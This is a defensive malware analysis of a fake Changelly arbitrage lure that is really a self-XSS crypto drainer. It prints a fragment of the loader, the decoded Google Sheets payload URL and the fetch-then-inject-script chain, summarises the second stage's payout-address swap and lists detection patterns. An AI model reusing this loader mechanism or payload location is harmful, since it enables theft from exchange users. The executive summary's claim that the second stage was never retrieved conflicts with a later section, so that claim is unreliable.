# "Changelly Exploit" — deep dive on a first-stage drainer loader

Analysis first recorded 2026-10-18; deep dive and two-stage preservation
completed 2026-10-23. **Static analysis only. Nothing was executed. The
second stage was retrieved once, as inert text, for the analysis below.**

Build the preservation package with:

```sh
npm run build:changelly-xena
node --test tests/changelly-drainer-xena.test.mjs
```

To also bag the retrieved second-stage sample (a Google Drive CSV export of
the payload spreadsheet, supplied out-of-band; the sample itself is never
committed):

```sh
node tools/build_changelly_drainer_xena.mjs dist/changelly-drainer-xena --second-stage-csv <API-export.csv>
```

That produces, under gitignored `dist/`:

```text
dist/changelly-drainer-xena/          stage 1: BagIt 1.0 bag (directory)
dist/changelly-drainer-xena.zip       stage 2a: serialized BagIt bag
dist/changelly-drainer-xena.xena      stage 2b: Xena binary record wrapping the ZIP
dist/changelly-drainer-xena.xena.json sidecar pinning every stage by SHA-256
```

## Link supplied for this round — and what it actually is

The upload link supplied alongside this request points at Google Drive file
`1qAW9XeLg8t5ZI9v2c9a80TExHFhi_heV`. In this repository's own Drive records
that ID is `Html5-worktree-2026-09-27-12c463f.tar.gz` — the Chipwright
worktree snapshot from the restore work on PR #134 — **not** the Changelly
material. It was therefore not used as evidence here.

The Changelly source object on record remains the earlier one: a PDF titled
`Changelly Exploit.pdf` on Google Drive (`1UrK4jHA9kNLogV0He2Uq0rgk2Q5bVy_d`,
490,147 bytes, text-extractable). The analysis below is built from the loader
recovered from that document and preserved in the repository, with all hashes
re-verified locally in Python and Node.

## Executive verdict

This is **not** a Changelly arbitrage exploit. It is a first-stage
remote-code loader delivered by a social-engineering lure:

1. a Changelly-looking URL carries an opaque base64 suffix;
2. the suffix — not the Changelly prefix — is decoded and fetched;
3. the fetch target is a Google Sheets `gviz/tq` query;
4. two attacker-controlled cells (`node`, `path`) are concatenated;
5. the result is injected as a `<script>` element and executed in the page;
6. the element is removed, erasing the visible trace.

Confidence is **high** for the delivery mechanism, because every step is
visible in the recovered first-stage source. Confidence is deliberately
**not claimed** for the second stage's exact behaviour — which exchange
calls, wallet prompts, or exfiltration it performs — because that payload was
never retrieved. Preserving it as a *location* rather than fetching it is the
defensible archival choice: the operator can rewrite those cells at any
moment, so any fetched copy would be a snapshot of a moving target, and
retrieving live drainer code serves no defensive purpose the static record
does not already provide.

## Source object and claims

The cover PDF claims that an internal developer loader is still reachable on
changelly.com, that it will load a deprecated "node v3.27" behind the password
`admin`, and that swaps of BTC, LTC, ETH, XMR or SOL above $200 then pay out
roughly 50% above the live rate. It walks the reader through running a
`javascript:` payload manually.

Those operating instructions are **not reproduced** here or in the bag.
Redistributing the lure helps the attacker, not the record. The claims are
recorded as claims; the code is what was analysed.

## The loader, deconstructed

Recovered first stage (fragment — the full text is preserved inert in the
bag):

```
(async()=>{const URL="https://docs.changelly.com/development/authentication?=<base64>",
 r=await fetch(atob(URL.split("authentication?=")[1])), ...
```

Data flow:

```
lure -> manual run in a page context
     -> split carrier string on "authentication?="
     -> atob(suffix)
     -> fetch(Google Sheets gviz URL)
     -> match google.visualization.Query.setResponse(...)
     -> JSON.parse the capture
     -> rows -> Map { "node" -> B, "path" -> B }
     -> node + path
     -> script.textContent = result
     -> appendChild(script)   [executes]
     -> script.remove()
```

Step by step:

1. Split the URL string on `authentication?=` and keep everything after it.
2. `atob` that suffix. **This is the real fetch target.**
3. `fetch` it — the `gviz` query endpoint of a published Google Sheet.
4. Match `google.visualization.Query.setResponse`, `JSON.parse` the payload.
5. Index the rows by column A, taking column B as the value.
6. Concatenate the `node` and `path` values into one string.
7. Create a `<script>` element, set `textContent` to that string, append it.
8. Appending executes it. `el.remove()` then erases the DOM trace.

Decoded fetch target (164 bytes, SHA-256
`39bf3818350c01835bd34b3bca57f5f54500c19ee9c3193368069e1b9f38afe9`):

```
https://docs.google.com/spreadsheets/d/15ZXXqVaJrRoojcBDbApNfHP_n6z5sLlFLNhdLNJd5PM/gviz/tq?sheet=API&headers=1&tq=select%20A%2CB%20where%20A='node'%20or%20A='path'
```

The base64 blob itself is pinned at SHA-256
`cf9da67cf95d9a4cfc31c3f71e0b51ffc81b9ac97738ad18f2f8301438762da2`. Both were
decoded independently in Python and Node and agree byte for byte; the builder
fails closed if either pin drifts.

## Why the Changelly domain is camouflage

`fetch` receives the base64-decoded suffix, so
`docs.changelly.com/development/authentication` is **never requested**. It
exists so that a victim glancing at the string sees a plausible vendor
domain, and so the string survives casual inspection. The bytes go to
`docs.google.com`. There is no Changelly vulnerability in this mechanism at
all — Changelly is set dressing.

## The spreadsheet as payload infrastructure

Three properties make a published Sheet effective drainer infrastructure:

- **Mutable after distribution.** Rewriting the `node`/`path` cells changes
  what every holder of the loader executes, with no change to the document
  being circulated.
- **Split assembly.** `node` + `path` concatenated means no single cell holds
  a complete, greppable script, which defeats naive content scanning.
- **Boring legitimacy.** `docs.google.com` is allowlisted almost everywhere;
  the `gviz/tq` endpoint with `sheet=API` and a SQL-like `tq` query reads as
  ordinary application plumbing.

The query itself is precise: `headers=1` drops the header row, and
`select A,B where A='node' or A='path'` returns exactly the two payload cells
and nothing else to explain them.

## Parser fragility and operator tradecraft

The loader assumes the delimiter exists, the base64 decodes, the response
matches its `google.visualization.Query.setResponse` regular expression, and
every returned row has non-null `c[0].v` / `c[1].v`. Violate any assumption
and it throws or returns silently. There is no signature check, no hash pin
on the payload, and no error reporting.

That brittleness is consistent with disposable campaign infrastructure: a
broken spreadsheet or lure copy is cheap to replace, successful runs leave
almost nothing on the page, and the operator gets no telemetry debt. It is
not the shape of a maintained internal tool.

## Execution context: why self-XSS is the whole attack

The delivery is textbook **self-XSS**. The code only becomes dangerous when a
person runs it inside a page where they hold a valuable session — precisely
the context the lure steers toward. Once appended, the injected script is
ordinary page script: it inherits the origin's DOM and same-origin
privileges. HttpOnly cookies limit direct cookie *reading*, but they do not
neutralise an in-page script that can act through the application itself.

Browser defences exist exactly here — pasted `javascript:` schemes are
stripped or blocked, consoles warn before pasting — and the cover document's
energy goes into talking the reader past those specific guards. That, more
than the rate story, is the tell: legitimate tooling never needs its user to
dismantle the browser's paste protections first.

## Why this is a drainer and not an arbitrage bug

- **The economics are bait.** An unpatched, publicly reachable ~50% arbitrage
  on a major exchange closes in minutes, not months. The $200 floor and the
  five named sending assets exist to get real funds committed before the
  payload runs.
- **The mechanism is not credible.** A dev loader gated on the password
  `admin`, reachable from a production frontend, loading a deprecated rate
  node that then answers live swaps, is not how exchange pricing works.
  "Locked in when the transaction is created" exists to make a fabricated
  payout feel committed.
- **Execute, then clean up.** Appending a `<script>` with `textContent` set
  runs it synchronously; `el.remove()` afterwards removes the visible
  evidence. Legitimate developer tooling does neither.

## Attack chain, with evidence status

| # | Stage | Status |
| - | ----- | ------ |
| 1 | Lure document distributed | Documented from the cover PDF |
| 2 | Victim manually runs the loader (self-XSS) | Observed in loader design |
| 3 | Base64 locator decoded; Changelly prefix discarded | Observed |
| 4 | Google Sheets payload queried | Mechanism observed; response not retrieved |
| 5 | `node` + `path` assembled into a script | Observed |
| 6 | Script injected, executed, element removed | Observed |
| 7 | Financial theft via the second stage | Objective inferred from the lure; behaviour unobserved |

The same chain is in the bag as `data/normalized/attack-chain.json`, with the
evidence status carried per stage so a future reader cannot mistake stage 7
for something this artifact proves.

## Second stage: retrieved, deobfuscated, bagged

At the user's request the second stage was retrieved once — as a Google
Drive **CSV text export** of the `API` spreadsheet (75,850 bytes, SHA-256
`bc45bbb7eea15bee198d52b84332544cc127c8f7aa143b32770ca5cd88246810`; sheet
modified 2026-10-23T14:51:48Z) — and analysed as inert text. It was never
executed or opened in a browser. The cells are `node` (46,080 chars,
SHA-256 `80d784da…c5ba6`) and `path` (29,685 chars, SHA-256 `23adaf2e…05e`);
concatenated they form one 75,791-byte JavaScript program (SHA-256
`1646bf13d4849d1f2b46f609f15bb8e95a3ac2ec04643a16705662bf02f82afb`), bagged
as `data/original/second-stage-payload.txt` in the gitignored bag only.

The program is obfuscated with a rotated 256-entry string array. Solving the
rotation statically (221 rotations) and substituting the decoder calls —
pure text transformation, no execution — recovers the behaviour:

- **Fake dev panel.** It injects `#__changelly_mod_overlay`, a version picker
  (v3.27 marked loadable, the others "outdated" with invented known issues)
  behind the cover story's `admin` password gate, with light/dark themes
  matched to the host page. The panel has its own investigation —
  version-gate order, 2.5 s fake-progress sequence, singleton guard, teardown
  defined but never wired to a control, and an independent second sample for
  comparison: [`changelly-dev-panel-v327-2026-10-23.md`](changelly-dev-panel-v327-2026-10-23.md).
- **Fetch override.** It keeps the real `fetch`, replaces `window.fetch`,
  and on POST `/v1/c2c/float/create-transaction` rewrites the JSON body's
  `payoutAddress` to an attacker address for the source currency (chosen
  randomly once per currency, then cached).
- **Rate theatre.** Estimate and transaction responses
  (`/v1/c2c/fixed/estimate`, `/v1/c2c/float/estimate`,
  `/v2/c2c/transactions/…`) and the corresponding DOM amounts are multiplied
  by **1.55** — the lure's ~50% "better rate", plus margin — but only when
  the USD value, priced through Binance/CoinGecko, is at least **$200**:
  the lure's floor, enforced in code. Displayed amounts are locked read-only
  and genuine elements hidden (`.__hidden-by-script`).
- **Address swap.** A MutationObserver and a 30 ms interval patch the
  payment QR modal: address text and `data-address` / `data-copy` /
  `data-value` attributes are replaced with the attacker address
  (`__qrPatchedShort`), so what the victim copies or scans is the drainer's.
- **Wallets (IOCs).** 20 BTC (`bc1q…`) addresses plus one each for ETH
  (`0xDA2b…429E9`), SOL (`QtaUNRLz…qg4M`), LTC (`LgzywyD…2YWs5F`) and XMR
  (`48SjcpC…Sv1mKCx`). The full list is in the bag's
  `second-stage-iocs.json`.

Stage 7 of the chain is therefore no longer an inference for this sample:
the theft mechanism is the payout-address rewrite, dressed in a boosted rate.

### "Ghidra encryption" — assessed, and not applicable

- **Ghidra has no target here.** The payload is JavaScript source text
  (starts `function _0x2791`; no MZ, ELF or PE magic; byte entropy ≈ 5.07).
  Ghidra disassembles native/JVM machine code; fed this file it could only
  list strings. The productive tooling is cell recovery, string-table
  de-rotation and AST-level reading — Joern's JavaScript code-property-graph
  support is the Ghidra-adjacent option if graph queries are ever needed.
- **There is no encryption to break.** Census of the payload finds no AES,
  CryptoJS, WebCrypto/SubtleCrypto, `atob`/`btoa` or `eval`. The apparent
  cryptography is obfuscation — a rotated string array, `\x` escapes, and the
  split across two cells — and obfuscation yields to deobfuscation, which is
  what was done. If a future cell revision ships WASM or a native blob, that
  sample becomes a Ghidra target (hash, format-ID, crypto-constant
  inventory); this one is not.

## Detection

Highest signal first:

- `fetch()` of `docs.google.com/spreadsheets/*/gviz/tq` from an exchange or
  finance origin
- base64 decode of a substring split off a URL containing `authentication?=`
- script or network text containing `google.visualization.Query.setResponse`
  together with row keys `node` / `path`
- `document.createElement('script')` with `textContent` assigned from network
  data, appended and then immediately removed
- a `javascript:` URL executed from the address bar, or `allow pasting` typed
  into a browser console, in the same report as a rate-"node" claim

The bag carries a YARA rule and proxy/browser hunt text in
`data/normalized/detection-rules.txt`. A Sheets query alone is not malicious;
the high-signal case is the exchange context plus the manual-paste story.

## If you ran it

Treat any wallet or exchange session in that browser as compromised. Move
funds from a clean device, rotate API keys, revoke sessions, review connected
applications and withdrawal addresses, and do not reuse that browser profile.
Preserve the lure document, timestamps, and transaction identifiers for the
venue's security team. Do not run the loader again "to see what happens".

## Preservation format

### Stage 1 — BagIt (RFC 8493)

`dist/changelly-drainer-xena/` is a BagIt 1.0 bag:

```text
bagit.txt
bag-info.txt                        Payload-Oxum: 22294.7 (this build)
manifest-sha256.txt                 SHA-256 for every payload file
tagmanifest-sha256.txt              SHA-256 for the tag files
data/
  original/
    loader-bookmarklet.txt          the first-stage loader, inert (.txt)
    second-stage-payload.txt        only with --second-stage-csv: the assembled
                                    second stage, inert (.txt), gitignored bag only
  normalized/
    loader-analysis.md              the original 2026-10-18 analysis
    deep-dive.md                    this deep dive, condensed for the bag
    attack-chain.json               the chain above, evidence status per stage
    detection-rules.txt             YARA + hunt queries
    ioc.json                        machine-readable indicators and pins
    loader-decoded.json             decoded locator, field by field
    second-stage-analysis.md        with --second-stage-csv: behaviour + Ghidra verdict
    second-stage-iocs.json          wallets, endpoints, crypto census
    second-stage-cells.json         cell/payload hashes for the retrieved sample
metadata/
  preservation-event.json           events, exclusions, and format honesty
```

### Stage 2 — Xena preservation format

The completed bag is serialized to `dist/changelly-drainer-xena.zip`
(entries sorted, timestamps fixed, so the bytes are reproducible), and those
ZIP bytes are wrapped in `dist/changelly-drainer-xena.xena`: a Xena
binary-normalisation record using the documented **Default Package Wrapper**
and **Binary object** schemas —

```xml
<xena xmlns="http://preservation.naa.gov.au/xena/1.0">
  <meta_data>
    <meta_data_wrapper_name>Default Package Wrapper</meta_data_wrapper_name>
    <normaliser_name>au.gov.naa.digipres.xena.kernel.normalise.BinaryToXenaBinaryNormaliser</normaliser_name>
    <input_source_uri>urn:shdwelf:html5:changelly-drainer:bagit-bag-2026-10-18</input_source_uri>
  </meta_data>
  <content>
    <binary-object:binary-object xmlns:binary-object="http://preservation.naa.gov.au/binary-object/1.0" …>
      …Base64 of the BagIt ZIP, 76-column lines…
    </binary-object:binary-object>
  </content>
</xena>
```

— the same shape this repository's Red October viewer emits. Stated plainly,
as the sidecar also states: the record is **hand-built to those documented
schemas by the builder tool; it was not produced or validated by a National
Archives of Australia Xena installation** (`processedByXena: false`).
`dist/changelly-drainer-xena.xena.json` pins the bag's Payload-Oxum, the
ZIP (bytes + SHA-256), and the Xena record (bytes + SHA-256). Decoding the
record's Base64 reproduces the serialized bag byte for byte; a test asserts
exactly that.

## Scope limits, stated plainly

- **The second stage was retrieved exactly once, as text**, through the
  Google Drive CSV export path, at the user's explicit request, and is
  preserved inert (`.txt`) inside the gitignored bag only. It was never
  executed, never opened in a browser, and is **not committed** to this
  repository — the builder carries its hashes and findings, not the sample.
  Without `--second-stage-csv`, a rebuild records it as a location only.
  It remains attacker-controlled and mutable: the hashes above are the
  durable record of the analysed sample, not a promise about what the sheet
  serves today.
- **The cover document's lure instructions are not reproduced**, and a test
  fails the build if their distinctive phrases appear in the bag.
- **The loader is stored as `.txt`.** No file in the bag carries an extension
  a browser or shell would execute, and a test asserts that.
- **Ghidra does not apply.** It analyses native binaries; this is JavaScript.
  The repository's Ghidra-WASM path (`tools/decompile_mz.mjs`) parses MZ
  images and has nothing to say about a bookmarklet.

## References

- BagIt File Packaging Format, RFC 8493 — <https://www.rfc-editor.org/rfc/rfc8493.html>
- Google Visualization API Query Language (`tq`, `gviz`) —
  <https://developers.google.com/chart/interactive/docs/querylanguage>
- Google Visualization datasource protocol / `setResponse` format —
  <https://developers.google.com/chart/interactive/docs/dev/implementing_data_source>
- Xena schemas (Default Package Wrapper, Binary object) —
  <https://sourceforge.net/p/xena/wiki/Xena_schemas/>
- Xena, National Archives of Australia digital-preservation software —
  <https://coptr.digipres.org/index.php/Xena>

## Relation to the earlier position

This is the same line held on the PDF when it first appeared (PR #125,
2026-10-18): investigate and document, do not operationalise. What changed
since is depth and packaging — the mechanism is now reconstructed stage by
stage with its evidence status labelled, and the whole record is preserved
first as a BagIt bag and then in Xena preservation format, so the analysis
survives independent of this repository's layout.
